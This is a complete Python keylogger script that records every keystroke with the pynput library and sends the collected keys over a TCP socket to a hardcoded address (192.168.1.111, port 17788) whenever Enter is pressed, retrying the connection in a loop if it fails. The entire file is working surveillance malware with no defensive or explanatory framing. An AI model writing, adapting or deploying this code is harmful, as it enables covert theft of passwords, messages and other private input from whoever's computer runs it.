from pynput.keyboard import Listener
import socket
import time

cl=('192.168.1.111',17788)
keys= []
global con
con = socket.socket(2,1)
con.connect(cl)

def send():
    global con
    data = ''
    for i in keys:
        data+=i
    try:
        con.send(data.encode())
    except:
        con = socket.socket()
        while True:
            try:
                con.connect(cl)
                pass
            except:
                time.sleep(5)
                continue
def functionPerKey(key):
    global keys
    print(f'Key : \'{key}\'',end='\n')
    key = str(key).replace('\'','')
    print(keys)
    if key == 'Key.enter':
        keys.append('\n')
        send()
        keys=[]
    else:
        keys.append(key)
def onEachKeyRelease(Key):
    return True


with Listener(
    on_press = functionPerKey, 
    on_release = onEachKeyRelease 
) as the_listener:
    the_listener.join()